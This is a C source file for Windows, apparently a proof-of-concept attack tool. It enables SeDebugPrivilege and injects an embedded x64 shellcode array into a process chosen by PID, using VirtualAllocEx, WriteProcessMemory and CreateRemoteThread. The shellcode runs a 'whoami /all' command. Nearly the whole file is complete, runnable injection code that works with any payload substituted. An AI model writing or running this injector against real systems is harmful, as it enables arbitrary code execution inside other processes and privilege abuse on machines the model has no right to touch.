#include <windows.h>
#include <tlhelp32.h>
#include <winnt.h>
#include <sddl.h>
#include <ntsecapi.h>
#include <stdio.h>


// some parts of this code such as the following functions are useless since i removed automated system process finding, so some of the code doesn't make sense and i aplogize if it negatively impacted or ruined your day
BOOL WsidQmark(PSID eseaydee) { //apparently this check is useless because sedebug doesn't grant you to read tokens so we just return true because i liked writing this function
    BOOL result = FALSE;
    PSID systemSid = NULL;

    if (!ConvertStringSidToSidA("S-1-5-18", &systemSid)) { // SID we want the target process to have (filter)
        return TRUE; // Conversion failed
    }

    if (EqualSid(eseaydee, systemSid)) {
        result = TRUE;
    }

    LocalFree(systemSid);
    return TRUE; //intentional lying for purposes
}

unsigned char shellcode[] = 
"\xfc\x48\x83\xe4\xf0\xe8\xc0\x00\x00\x00\x41\x51\x41\x50"
"\x52\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60\x48\x8b\x52"
"\x18\x48\x8b\x52\x20\x48\x8b\x72\x50\x48\x0f\xb7\x4a\x4a"
"\x4d\x31\xc9\x48\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\x41"
"\xc1\xc9\x0d\x41\x01\xc1\xe2\xed\x52\x41\x51\x48\x8b\x52"
"\x20\x8b\x42\x3c\x48\x01\xd0\x8b\x80\x88\x00\x00\x00\x48"
"\x85\xc0\x74\x67\x48\x01\xd0\x50\x8b\x48\x18\x44\x8b\x40"
"\x20\x49\x01\xd0\xe3\x56\x48\xff\xc9\x41\x8b\x34\x88\x48"
"\x01\xd6\x4d\x31\xc9\x48\x31\xc0\xac\x41\xc1\xc9\x0d\x41"
"\x01\xc1\x38\xe0\x75\xf1\x4c\x03\x4c\x24\x08\x45\x39\xd1"
"\x75\xd8\x58\x44\x8b\x40\x24\x49\x01\xd0\x66\x41\x8b\x0c"
"\x48\x44\x8b\x40\x1c\x49\x01\xd0\x41\x8b\x04\x88\x48\x01"
"\xd0\x41\x58\x41\x58\x5e\x59\x5a\x41\x58\x41\x59\x41\x5a"
"\x48\x83\xec\x20\x41\x52\xff\xe0\x58\x41\x59\x5a\x48\x8b"
"\x12\xe9\x57\xff\xff\xff\x5d\x48\xba\x01\x00\x00\x00\x00"
"\x00\x00\x00\x48\x8d\x8d\x01\x01\x00\x00\x41\xba\x31\x8b"
"\x6f\x87\xff\xd5\xbb\xf0\xb5\xa2\x56\x41\xba\xa6\x95\xbd"
"\x9d\xff\xd5\x48\x83\xc4\x28\x3c\x06\x7c\x0a\x80\xfb\xe0"
"\x75\x05\xbb\x47\x13\x72\x6f\x6a\x00\x59\x41\x89\xda\xff"
"\xd5\x63\x6d\x64\x2e\x65\x78\x65\x20\x2f\x63\x20\x77\x68"
"\x6f\x61\x6d\x69\x20\x2f\x61\x6c\x6c\x20\x3e\x20\x43\x3a"
"\x5c\x74\x65\x6d\x70\x5c\x77\x68\x6f\x61\x6e\x65\x77\x2e"
"\x74\x78\x74\x00";

int main(int argc, char *argv[]) {
    printf("SeDebugPrivilege shellcode injection PoC - Brought to you by \\u0030xUnd3adBeef\n");
    if (argc < 2) {
        printf("Usage: %s <PID>\n", argv[0]);
        printf("Example: %s 1234\n", argv[0]);
        return 0;
    }
    
    DWORD targetPid = atoi(argv[1]);
    printf("Begin - Targeting PID: %lu\n", targetPid); 
    fflush(stdout);
    
    HANDLE currentProcessToken;
    LUID SeDbgPrivilegeLuid;
    TOKEN_PRIVILEGES currentTokenPrivs;

    if (!OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &currentProcessToken)) {
        printf("[-] Failed to open process token\nError code : %d\n", GetLastError()); 
        fflush(stdout);
        return -1;
    }
    
    LookupPrivilegeValue(NULL, SE_DEBUG_NAME, &SeDbgPrivilegeLuid);

    currentTokenPrivs.PrivilegeCount = 1;
    currentTokenPrivs.Privileges[0].Luid = SeDbgPrivilegeLuid;
    currentTokenPrivs.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;

    if (!AdjustTokenPrivileges(currentProcessToken, FALSE, &currentTokenPrivs, 0, NULL, NULL)) { 
        printf("[-] Failed to enable SeDebugPrivilege\nError code : %d\n", GetLastError()); 
        fflush(stdout);
        return -1;
    } else { 
        printf("[+] Successfully enabled SeDebugPrivilege on current token\n"); 
        fflush(stdout);
    }

    // Manual PID targeting - auto process seeking approach commented out
    HANDLE hProc2 = OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_VM_OPERATION | PROCESS_VM_WRITE | PROCESS_VM_READ | PROCESS_CREATE_THREAD, FALSE, targetPid);
    
    if (!hProc2) {
        printf("[!] Failed opening target PID %lu\n  -> Error code : %d\n", targetPid, GetLastError()); 
        fflush(stdout);
        return -1;
    } else { 
        printf("[+] Successfully opened process with PID: %lu\n", targetPid); 
        fflush(stdout);
    }

    HANDLE hToken1;
    if (!OpenProcessToken(hProc2, TOKEN_QUERY, &hToken1)) {
        printf("[-] Failed to OpenProcessToken with TOKEN_QUERY\nError code : %d\n", GetLastError()); 
        printf("Continuing anyway .. . .. \n");
        fflush(stdout);
    } else { 
        printf("[+] Successfully Opened ProcessToken with TOKEN_QUERY\n"); 
        printf("Skipping further token checks\n");
        fflush(stdout);
    }

    // Token information code commented out - not needed for injection
    /*
    DWORD neededSize = 0;
    if (!GetTokenInformation(hToken1, TokenUser, NULL, 0, &neededSize)) {
        printf("[-] Failed to GetTokenInformation\nError code : %d\n", GetLastError()); 
        fflush(stdout);
    }
    
    BYTE *BUFFER = malloc(neededSize);
    ZeroMemory(BUFFER, neededSize);

    if (!GetTokenInformation(hToken1, TokenUser, BUFFER, neededSize, &neededSize)) {
        printf("[-] Failed to get token info\nError code : %d\n", GetLastError()); 
        fflush(stdout);
        free(BUFFER);
    } else {
        TOKEN_USER *hToken2 = (TOKEN_USER *)BUFFER;
        if (WsidQmark(hToken2->User.Sid)) {
            printf("[+] Process SID matches SYSTEM\n");
        }
        free(BUFFER);
    }
    */

    LPVOID remoteMemory1;
    HANDLE hRemoteThread;

    if (!(remoteMemory1 = VirtualAllocEx(hProc2, NULL, 2048, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE))) {
        CloseHandle(hProc2);
        if (hToken1) CloseHandle(hToken1);
        printf("[!] Failed allocating memory\n  -> Error code : %d\n", GetLastError());
        fflush(stdout);
        return -1;
    } else { 
        printf("[+] Success while allocating remote memory\n");
        fflush(stdout); 
    }
    
    if (!WriteProcessMemory(hProc2, remoteMemory1, shellcode, sizeof(shellcode), NULL)) {
        printf("[!] Failed writing memory\n  -> Error code : %d\n", GetLastError());
        fflush(stdout);
        VirtualFreeEx(hProc2, remoteMemory1, 0, MEM_RELEASE);
        CloseHandle(hProc2);
        if (hToken1) CloseHandle(hToken1);
        return -1;
    } else { 
        printf("[+] Success while writing remote memory\n"); 
    }
    
    if (!(hRemoteThread = CreateRemoteThread(hProc2, NULL, 0, remoteMemory1, NULL, CREATE_SUSPENDED, NULL))) {
        printf("[!] Failed creating remote thread\n  -> Error code : %d\n", GetLastError());
        fflush(stdout);
        VirtualFreeEx(hProc2, remoteMemory1, 0, MEM_RELEASE);
        CloseHandle(hProc2);
        if (hToken1) CloseHandle(hToken1);
        return -1;
    } else { 
        printf("[+] Success while creating remote thread\n"); 
        fflush(stdout); 
    }

    printf("[~] Attempting to start remote thread . . .\n");
    fflush(stdout);

    if (!ResumeThread(hRemoteThread)) {
        printf("[!] Failed to resume thread\n  -> Error code : %d\n", GetLastError());
        fflush(stdout);
        CloseHandle(hRemoteThread);
        VirtualFreeEx(hProc2, remoteMemory1, 0, MEM_RELEASE);
        CloseHandle(hProc2);
        if (hToken1) CloseHandle(hToken1);
        return -1;
    } else { 
        printf("[ +++ ] Remote thread started successfully in PID %lu\n", targetPid); 
        fflush(stdout); 
    }

    // Cleanup
    CloseHandle(hRemoteThread);
    CloseHandle(hProc2);
    if (hToken1) CloseHandle(hToken1);
    
    printf("[+] Injection completed\n");
    fflush(stdout);
    return 0;
}
